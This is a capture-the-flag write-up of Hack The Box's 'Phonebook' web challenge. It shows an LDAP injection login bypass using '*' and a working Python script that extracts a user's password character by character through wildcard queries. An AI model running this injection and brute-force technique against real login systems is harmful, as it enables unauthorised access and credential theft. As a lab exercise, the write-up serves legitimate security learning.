## Phonebook

Phonebook is a web app that showed a login page first. There is a hint 'You can now login using the workstation username and password! - Reese' what points to ldap. I tried the simplest injection (https://www.synopsys.com/glossary/what-is-ldap-injection.html) - by setting username and password as '*' and it worked. The phonebook page opened and I searched few queries, but there was nothing useful here. 
The next thought was - If Reese has configured ldap she (or he) is admin and maybe I have to find out his password (Actually I first tried to find her phone in the list, but it wasn't useful). So I tried flag-formatted password 'HTB{*}' with 'Reese' username and it worked. Up to this point I've tried many passwords and haven't been blocked, so I decided to write bruteforce script.

```python
import requests
import string
import time

def retry(func):
    n = 3
    def wrapper(*args, **kwargs):
        last_exc = None
        for i in range(n):
            try:
                return func(*args, **kwargs)
            except OSError as e:
                last_exc = e
                if i != n - 1:
                  time.sleep(1)
                continue
        raise last_exc


    return wrapper


url = 'http://46.101.21.240:30672/login' 

password = 'HTB{'

alphabet = set(list(string.ascii_letters))
alphabet = alphabet.union(set(list(string.digits)))
# without * coz it wildcard
alphabet = alphabet.union(set(list(string.punctuation))).difference({'*'})

data = {'username': 'Reese', 'password': password}

@retry
def try_password(password):
    data['password'] = password
    r = requests.post(url, data=data, allow_redirects=False)
    # / - correct password, /login?message=Authentication failed - incorrect
    return r.headers.get('location') == '/'

def brute_symbol(password):
    for ch in alphabet:
        if try_password(password + ch + '*'):
            return password + ch

while True:
  password = brute_symbol(password)
  assert password is not None
  print(password)
  if password[-1] == '}' and try_password(password):
      break
```
